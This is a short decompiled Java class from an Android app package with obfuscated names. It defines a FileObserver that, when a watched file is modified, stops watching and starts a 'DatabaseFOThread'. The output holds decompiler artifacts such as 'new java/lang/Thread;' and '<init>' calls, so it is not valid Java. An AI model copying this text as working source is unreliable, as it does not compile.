package com.vvt.p;

import android.os.FileObserver;

public abstract class a
  extends FileObserver
{
  private static final boolean a = com.vvt.ak.a.a;
  private long b = 2000L;
  
  public a(String paramString)
  {
    super(paramString);
  }
  
  public abstract void b();
  
  public void onEvent(int paramInt, String paramString)
  {
    int i = 2;
    if (paramInt == i)
    {
      boolean bool = a;
      if (bool) {}
      stopWatching();
      Thread localThread = new java/lang/Thread;
      b localb = new com/vvt/p/b;
      localb.<init>(this);
      String str = "DatabaseFOThread";
      localThread.<init>(localb, str);
      localThread.start();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/p/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */